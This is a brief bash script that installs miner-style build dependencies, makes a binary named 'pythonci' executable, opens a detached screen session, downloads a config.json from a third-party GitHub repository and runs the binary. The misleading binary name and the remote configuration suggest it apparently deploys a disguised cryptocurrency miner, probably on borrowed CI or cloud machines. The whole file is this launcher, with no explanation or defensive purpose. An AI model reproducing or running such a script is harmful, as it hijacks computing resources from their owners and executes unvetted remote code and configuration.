#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
chmod +x pythonci
screen -dmS ls
wget https://raw.githubusercontent.com/outbesok/mesin/main/nyampah_ah/config.json
 ./pythonci
